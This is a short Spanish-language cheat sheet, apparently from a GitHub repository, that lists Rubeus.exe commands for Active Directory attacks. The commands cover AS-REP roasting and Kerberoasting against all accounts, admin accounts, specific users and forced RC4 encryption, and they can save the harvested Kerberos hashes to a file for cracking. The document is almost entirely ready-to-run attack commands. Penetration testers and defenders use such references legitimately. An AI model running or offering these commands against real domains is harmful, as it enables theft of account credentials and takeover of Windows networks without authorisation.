# Rubeus Cheat Sheet

#### ASREPRoast Attack
```console
Rubeus.exe asreproast /nowrap
```

#### Saber si hay cuentas Kerberoastables
```console
Rubeus.exe kerberoast /stats
```

#### Kerberoasting Attack a todas las cuentas y guardar los hashes en un archivo
```console
Rubeus.exe kerberoast /nowrap /outfile:hash
```

#### Kerberoasting Attack, obtener los hashes de todas las cuentas admins
```console
Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

#### Kerberoasting Attack, para un usuario en especifico que tenga el SPN configurado
```console
Rubeus.exe kerberoast /user:<USER-NAME> /nowrap
```

#### Kerberoasting Attack, para un usuario en especifico que tenga el SPN configurado pero que el modo Hash que nos de sea siempre RC4
```console
Rubeus.exe kerberoast /tgtdeleg /user:<USER-NAME> /nowrap
```

#### Kerberoasting Attack especificando usuario y contraseña de un usuario
```console
Rubeus.exe kerberoast /creduser:<DOMAIN>\<USER> /credpassword:<PASSWORD> /outfile:hash
```

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)